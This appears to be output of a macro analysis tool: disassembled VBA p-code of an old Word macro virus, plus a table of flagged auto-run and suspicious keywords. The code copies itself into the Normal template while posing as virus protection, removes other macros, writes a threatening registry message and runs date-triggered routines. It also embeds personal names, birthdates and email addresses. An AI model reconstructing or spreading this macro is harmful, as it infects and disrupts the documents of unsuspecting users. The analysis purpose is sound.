' 	VarDefn NYes (As Boolean)
' Line #267:
' 	LitVarSpecial (False)
' 	St NYes 
' Line #268:
' 	OnError temp 
' Line #269:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #270:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0008 "OBSv2904"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NYes 
' 	EndIf 
' Line #271:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0003 "OBS"
' 	Eq 
' 	IfBlock 
' Line #272:
' 	LitStr 0x0044 "Alm.Midiawaty Is Upgrading It Self From  Ophay Bussines Solution to "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x002B " to Normal Template for virus protection..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #273:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #274:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "OBSv2904"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #275:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0008 "OBSv2904"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #276:
' 	LitStr 0x000C "Found Virus "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0014 " in Normal Template "
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #277:
' 	LitStr 0x0038 "Ophay Bussines Solution will automaticly removing Virus "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0013 " in Normal Template"
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #278:
' 	ArgsCall Wait 0x0000 
' Line #279:
' 	ArgsCall CapNormal 0x0000 
' Line #280:
' 	LitStr 0x000F "Removing Virus "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0044 " in Normal Template to protect your global document...Please Wait!! "
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #281:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #282:
' 	EndIfBlock 
' Line #283:
' 	EndIfBlock 
' Line #284:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #285:
' 	Ld NYes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #286:
' 	LitStr 0x0045 "Alm.Midiawaty Is Backing Up It Self From  Ophay Bussines Solution to "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x002B " to Normal Template for virus protection..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #287:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "OBSv2904"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #288:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #289:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #290:
' 	EndIfBlock 
' Line #291:
' 	Label temp 
' Line #292:
' 	EndSub 
' Line #293:
' 	FuncDefn (Sub HelpAbout())
' Line #294:
' 	ArgsCall Beep 0x0000 
' Line #295:
' 	LineCont 0x0014 08 00 0B 00 0F 00 0B 00 16 00 0B 00 1D 00 0B 00 24 00 0B 00
' 	LitStr 0x002D "                           Alm.Midiawaty ,SE."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0029 "I was born in SURABAYA, 29 Desember 1975."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0033 "My bad day come and take me to heaven on 23 Nov 97."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "Happines...Joynes always cause OphaySR & God Love Me."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0024 "So, come and join with me in heaven."
' 	Concat 
' 	Ld vbOKOnly 
' 	LitDI2 0x0040 
' 	Add 
' 	LitStr 0x0003 "OBS"
' 	ArgsCall MsgBox 0x0003 
' Line #296:
' 	EndSub 
' Line #297:
' 	FuncDefn (Sub MDBirth())
' Line #298:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St Dt 
' Line #299:
' 	Ld Dt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #300:
' 	ArgsCall CreaHTML 0x0000 
' Line #301:
' 	ArgsCall CapNormal 0x0000 
' Line #302:
' 	ExitSub 
' Line #303:
' 	EndIfBlock 
' Line #304:
' 	Ld Dt 
' 	LitDI2 0x000B 
' 	Eq 
' 	IfBlock 
' Line #305:
' 	ArgsCall CreaHTML 0x0000 
' Line #306:
' 	ArgsCall CapNormal 0x0000 
' Line #307:
' 	ExitSub 
' Line #308:
' 	EndIfBlock 
' Line #309:
' 	Ld Dt 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #310:
' 	ArgsCall CreaHTML 0x0000 
' Line #311:
' 	ArgsCall CapNormal 0x0000 
' Line #312:
' 	ExitSub 
' Line #313:
' 	EndIfBlock 
' Line #314:
' 	Ld Dt 
' 	LitDI2 0x0017 
' 	Eq 
' 	IfBlock 
' Line #315:
' 	ArgsCall CreaHTML 0x0000 
' Line #316:
' 	ArgsCall CapNormal 0x0000 
' Line #317:
' 	ExitSub 
' Line #318:
' 	EndIfBlock 
' Line #319:
' 	Ld Dt 
' 	LitDI2 0x0018 
' 	Eq 
' 	IfBlock 
' Line #320:
' 	ArgsCall CreaHTML 0x0000 
' Line #321:
' 	ArgsCall CapNormal 0x0000 
' Line #322:
' 	ExitSub 
' Line #323:
' 	EndIfBlock 
' Line #324:
' 	Ld Dt 
' 	LitDI2 0x001D 
' 	Eq 
' 	IfBlock 
' Line #325:
' 	ArgsCall CreaHTML 0x0000 
' Line #326:
' 	ArgsCall CapNormal 0x0000 
' Line #327:
' 	ExitSub 
' Line #328:
' 	EndIfBlock 
' Line #329:
' 	EndSub 
' Line #330:
' 	FuncDefn (Sub Email())
' Line #331:
' 	ArgsCall EmailOBS 0x0000 
' Line #332:
' 	ArgsCall EmailSAC 0x0000 
' Line #333:
' 	EndSub 
' Line #334:
' 	FuncDefn (Sub EmailOBS())
' Line #335:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #336:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #337:
' 	LitStr 0x000D "OBS@Yahoo.Com"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #338:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #339:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #340:
' 	Ld Selection 
' 	MemLd Range 
' 	ParamNamed Range 
' 	Ld Selection 
' 	MemLd Comments 
' 	ArgsMemCall Add 0x0001 
' Line #341:
' 	LitStr 0x0025 "Ophay Bussines Solution EMail Address"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #342:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	ArgsMemCall Close 0x0000 
' Line #343:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #344:
' 	EndSub 
' Line #345:
' 	FuncDefn (Sub EmailSAC())
' Line #346:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #347:
' 	Ld wdBlue 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #348:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #349:
' 	LitStr 0x000F "SAC@HotMail.Com"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #350:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #351:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #352:
' 	Ld Selection 
' 	MemLd Range 
' 	ParamNamed Range 
' 	Ld Selection 
' 	MemLd Comments 
' 	ArgsMemCall Add 0x0001 
' Line #353:
' 	LitStr 0x0024 "Sura Agung Computer Custumer Service"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #354:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	ArgsMemCall Close 0x0000 
' Line #355:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #356:
' 	EndSub 
' Line #357:
' 	FuncDefn (Sub MiDiDay())
' Line #358:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St Dt 
' Line #359:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	St MT 
' Line #360:
' 	Ld Dt 
' 	LitDI2 0x0014 
' 	Eq 
' 	Ld MT 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #361:
' 	LitStr 0x002A "Happy Birthday to OphaySR and Good Luck..."
' 	Ld Application 
' 	MemSt Caption 
' Line #362:
' 	LitStr 0x0030 "Alm.Midiawaty remain you every 20 January . . . "
' 	Ld Application 
' 	MemSt StatusBar 
' Line #363:
' 	Ld wdCollapseEnd 
' 	ParamNamed Direction 
' 	Ld Selection 
' 	ArgsMemCall Collapse 0x0001 
' Line #364:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Range 
' 	With 
' Line #365:
' 	MemLdWith Font 
' 	ArgsMemCall reset 0x0000 
' Line #366:
' 	ArgsCall OphayFirst 0x0000 
' Line #367:
' 	LitStr 0x002A "Happy Birthday to OphaySR and Good Luck..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #368:
' 	ArgsCall OphaySecond 0x0000 
' Line #369:
' 	LitStr 0x0120 "Ophay was born in JAKARTA, 20 JANUARY 1977. She was Graduated from SMAN 6 High School and He've been college on STIE IBiI. Happiness...Joyless always cause OphaySR & God Love Me. But, Someday I Will Come To You. On a Paradise City, I Hope ... So, come and join with me in heaven, Someday."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #370:
' 	ArgsCall OphayThird 0x0000 
' Line #371:
' 	LitStr 0x0008 "Ophay SR"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #372:
' 	ArgsCall MDForever 0x0000 
' Line #373:
' 	LitStr 0x0014 "Remain on 20 January"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #374:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #375:
' 	ArgsCall Email 0x0000 
' Line #376:
' 	EndWith 
' Line #377:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #378:
' 	ArgsCall HelpAbout 0x0000 
' Line #379:
' 	ArgsCall KingDestroy 0x0000 
' Line #380:
' 	ExitSub 
' Line #381:
' 	EndIfBlock 
' Line #382:
' 	Ld Dt 
' 	LitDI2 0x0018 
' 	Eq 
' 	Ld MT 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #383:
' 	LitStr 0x0027 "My Wedding Day still remain on mind ..."
' 	Ld Application 
' 	MemSt Caption 
' Line #384:
' 	LitStr 0x002C "Alm.Midiawaty remain you every 24 Mei . . . "
' 	Ld Application 
' 	MemSt StatusBar 
' Line #385:
' 	Ld wdCollapseEnd 
' 	ParamNamed Direction 
' 	Ld Selection 
' 	ArgsMemCall Collapse 0x0001 
' Line #386:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Range 
' 	With 
' Line #387:
' 	MemLdWith Font 
' 	ArgsMemCall reset 0x0000 
' Line #388:
' 	ArgsCall OphayFirst 0x0000 
' Line #389:
' 	LitStr 0x003D "Happy Wedding Day to OphaySR & Alm.Midiawaty and Good Luck..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #390:
' 	ArgsCall OphaySecond 0x0000 
' Line #391:
' 	LitStr 0x0154 "OphaySR was born in Jakarta, 20 January 1977. Midi was born in SURABAYA, 29 Desember 1975. People said We're best couple and God take her to heaven on 23 November 1997. Happiness...Joyless is always be, cause God Love Us. But, Someday I wishes come on the Wedding Dress again in Up there, I Hope ... So, On The Wedding Dress again, Someday."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #392:
' 	ArgsCall OphayThird 0x0000 
' Line #393:
' 	LitStr 0x0014 "Ophay SR & Midiawaty"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #394:
' 	ArgsCall MDForever 0x0000 
' Line #395:
' 	LitStr 0x0010 "Remain on 24 Mei"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #396:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #397:
' 	ArgsCall Email 0x0000 
' Line #398:
' 	EndWith 
' Line #399:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #400:
' 	ArgsCall HelpAbout 0x0000 
' Line #401:
' 	ArgsCall KingDestroy 0x0000 
' Line #402:
' 	ExitSub 
' Line #403:
' 	EndIfBlock 
' Line #404:
' 	Ld Dt 
' 	LitDI2 0x0012 
' 	Eq 
' 	Ld MT 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #405:
' 	LitStr 0x002A "Happy Birthday to Dewi .N and Good Luck..."
' 	Ld Application 
' 	MemSt Caption 
' Line #406:
' 	LitStr 0x0032 "Alm.Midiawaty remain you every 18 September . . . "
' 	Ld Application 
' 	MemSt StatusBar 
' Line #407:
' 	Ld wdCollapseEnd 
' 	ParamNamed Direction 
' 	Ld Selection 
' 	ArgsMemCall Collapse 0x0001 
' Line #408:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Range 
' 	With 
' Line #409:
' 	MemLdWith Font 
' 	ArgsMemCall reset 0x0000 
' Line #410:
' 	ArgsCall OphayFirst 0x0000 
' Line #411:
' 	LitStr 0x002A "Happy Birthday to Dewi .N and Good Luck..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #412:
' 	ArgsCall OphaySecond 0x0000 
' Line #413:
' 	LitStr 0x0072 "Dewi was born in JAKARTA, 18 September 1978. OphaySR & God Love You. I Hope ... So, On The Wedding Dress, Someday."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #414:
' 	ArgsCall OphayThird 0x0000 
' Line #415:
' 	LitStr 0x000D "Ophay SR & MD"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #416:
' 	ArgsCall MDForever 0x0000 
' Line #417:
' 	LitStr 0x0016 "Remain on 18 September"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #418:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #419:
' 	ArgsCall Email 0x0000 
' Line #420:
' 	EndWith 
' Line #421:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #422:
' 	ArgsCall HelpAbout 0x0000 
' Line #423:
' 	ArgsCall KingDestroy 0x0000 
' Line #424:
' 	ExitSub 
' Line #425:
' 	EndIfBlock 
' Line #426:
' 	Ld Dt 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld MT 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #427:
' 	LitStr 0x0036 "Happy Birthday to My Mother & Sari .N and Good Luck..."
' 	Ld Application 
' 	MemSt Caption 
' Line #428:
' 	LitStr 0x0030 "Alm.Midiawaty remain you every 2 November . . . "
' 	Ld Application 
' 	MemSt StatusBar 
' Line #429:
' 	ArgsCall HelpAbout 0x0000 
' Line #430:
' 	ArgsCall KingDestroy 0x0000 
' Line #431:
' 	ExitSub 
' Line #432:
' 	EndIfBlock 
' Line #433:
' 	Ld Dt 
' 	LitDI2 0x0017 
' 	Eq 
' 	Ld MT 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #434:
' 	LitStr 0x0017 "I Will Come to You ...."
' 	Ld Application 
' 	MemSt Caption 
' Line #435:
' 	LitStr 0x0031 "Alm.Midiawaty remain you every 23 November . . . "
' 	Ld Application 
' 	MemSt StatusBar 
' Line #436:
' 	ArgsCall Email 0x0000 
' Line #437:
' 	ArgsCall HelpAbout 0x0000 
' Line #438:
' 	ArgsCall KingDestroy 0x0000 
' Line #439:
' 	ExitSub 
' Line #440:
' 	EndIfBlock 
' Line #441:
' 	Ld Dt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld MT 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #442:
' 	LitStr 0x002F "Happy Birthday to Cristine LMA and Good Luck..."
' 	Ld Application 
' 	MemSt Caption 
' Line #443:
' 	LitStr 0x0031 "Alm.Midiawaty remain you every 01 Desember . . . "
' 	Ld Application 
' 	MemSt StatusBar 
' Line #444:
' 	Ld wdCollapseEnd 
' 	ParamNamed Direction 
' 	Ld Selection 
' 	ArgsMemCall Collapse 0x0001 
' Line #445:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Range 
' 	With 
' Line #446:
' 	MemLdWith Font 
' 	ArgsMemCall reset 0x0000 
' Line #447:
' 	ArgsCall OphayFirst 0x0000 
' Line #448:
' 	LitStr 0x0036 "Happy Birthday to Cristine Laorina MA and Good Luck..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #449:
' 	ArgsCall OphaySecond 0x0000 
' Line #450:
' 	LitStr 0x00D4 "Cristine was born in JAKARTA, 01 Desember 1976. She was Graduated from Boedoet High School and she've been college on STIE IBiI. Happiness...Joyless is always cause OphaySR & God Love You. I Hope ... So, Someday."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #451:
' 	ArgsCall OphayThird 0x0000 
' Line #452:
' 	LitStr 0x0008 "Ophay SR"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #453:
' 	ArgsCall MDForever 0x0000 
' Line #454:
' 	LitStr 0x0015 "Remain on 01 Desember"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #455:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #456:
' 	ArgsCall Email 0x0000 
' Line #457:
' 	EndWith 
' Line #458:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #459:
' 	ArgsCall HelpAbout 0x0000 
' Line #460:
' 	ArgsCall KingDestroy 0x0000 
' Line #461:
' 	ExitSub 
' Line #462:
' 	EndIfBlock 
' Line #463:
' 	Ld Dt 
' 	LitDI2 0x001D 
' 	Eq 
' 	Ld MT 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #464:
' 	LitStr 0x0037 "Born to raise heaven for Alm.Midiawaty and Good Luck..."
' 	Ld Application 
' 	MemSt Caption 
' Line #465:
' 	LitStr 0x0039 "Alm.Midiawaty remain you every month on 29 Desember. . . "
' 	Ld Application 
' 	MemSt StatusBar 
' Line #466:
' 	ArgsCall HelpAbout 0x0000 
' Line #467:
' 	ArgsCall KingDestroy 0x0000 
' Line #468:
' 	ExitSub 
' Line #469:
' 	EndIfBlock 
' Line #470:
' 	ArgsCall MDBirth 0x0000 
' Line #471:
' 	EndSub 
' Line #472:
' 	FuncDefn (Sub OphayReg())
' Line #473:
' 	Dim 
' 	VarDefn regs
' Line #474:
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	St regs 
' Line #475:
' 	LitStr 0x0013 "Sura Agung Computer"
' 	LitStr 0x0000 ""
' 	Ld regs 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #476:
' 	LitStr 0x0017 "Ophay Busisnes Solution"
' 	LitStr 0x0000 ""
' 	Ld regs 
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #477:
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	St regs 
' Line #478:
' 	LitStr 0x0026 "Sura Agung Computer, dddd dd MMMM yyyy"
' 	LitStr 0x0000 ""
' 	Ld regs 
' 	LitStr 0x0009 "sLongDate"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #479:
' 	LitStr 0x0043 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Detect"
' 	St regs 
' Line #480:
' 	LitStr 0x002F "Your Computer Is Already Infected With OBSVirus"
' 	LitStr 0x0000 ""
' 	Ld regs 
' 	LitStr 0x0004 "Info"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #481:
' 	LitStr 0x0041 "Please Contact OBS at 021-6506287 or your computer will be HangUp"
' 	LitStr 0x0000 ""
' 	Ld regs 
' 	LitStr 0x0005 "Info2"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #482:
' 	EndSub 
' Line #483:
' 	FuncDefn (Sub OphayFirst())
' Line #484:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #485:
' 	Ld wdBlue 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #486:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #487:
' 	EndSub 
' Line #488:
' 	FuncDefn (Sub OphaySecond())
' Line #489:
' 	LitDI2 0x0000 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #490:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #491:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #492:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #493:
' 	Ld wdAlignParagraphJustify 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #494:
' 	EndSub 
' Line #495:
' 	FuncDefn (Sub MDForever())
' Line #496:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #497:
' 	LitStr 0x0012 "Always and Forever"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #498:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #499:
' 	EndSub 
' Line #500:
' 	FuncDefn (Sub OphayThird())
' Line #501:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #502:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #503:
' 	EndSub 
' Line #504:
' 	FuncDefn (Sub CreaHTML())
' Line #505:
' 	Dim 
' 	VarDefn RootsyS (As String)
' Line #506:
' 	OnError (Resume Next) 
' Line #507:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #508:
' 	Ld RootsyS 
' 	LitStr 0x0011 "\Desktop\OBS.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #509:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "<HTML><HEAD><TITLE>OPHAY BUSSINES SOLUTION</TITLE>"
' 	PrintItemNL 
' Line #510:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "<BODY LINK='#0000ff' VLINK='#800080' BGCOLOR='#00ffff'>"
' 	PrintItemNL 
' Line #511:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0079 "</FONT></STRONG><P ALIGN='JUSTIFY'><A HREF='mailto:OBS@Yahoo.com'><B><FONT SIZE=6 COLOR='#800000'>OPHAY BUSSINES SOLUTION"
' 	PrintItemNL 
' Line #512:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0155 "</B></FONT><P ALIGN='JUSTIFY'>&nbsp;</P></A><FONT SIZE=6>    </FONT><FONT FACE='Courier New' COLOR='#ff00ff'>There’s the winter moon shining to my windows. I’m not as sleep because I miss you so. If I could I Know the way I felt today and this feeling so real because I Miss you so. I Think I’m in Love. It’s too late to say I’m in Love.</P>"
' 	PrintItemNL 
' Line #513:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<P ALIGN='JUSTIFY'>Please … send me to make it trought … I’m waiting forever. Don’t make me disapointed.</P>"
' 	PrintItemNL 
' Line #514:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00D9 "<P>Email To:</FONT><A HREF='mailto:OBS@Yahoo.Com'>OBS@Yahoo.Com</A>          <A HREF='; mailto: SAC@ Hotmail.Com '>SAC@Hotmail.Com</A>             <A HREF='mailto:Ophay@HotMail.Com'>Ophay@HotMail.Com</A></P><DIR><DIR>"
' 	PrintItemNL 
' Line #515:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00B3 "<FONT FACE='Courier New' COLOR='#ff00ff'><P ALIGN='RIGHT'>&nbsp;</FONT><A HREF='OPHAY@HotMail.Com'><B><FONT FACE='Impact' SIZE=6 COLOR='#ff0000'>OPHAY S.R</B></FONT></A></P></DIR>"
' 	PrintItemNL 
' Line #516:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "</DIR></BODY></HTML>"
' 	PrintItemNL 
' Line #517:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #518:
' 	EndSub 
' Line #519:
' Line #520:
' Line #521:
' Line #522:
' Line #523:
' Line #524:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
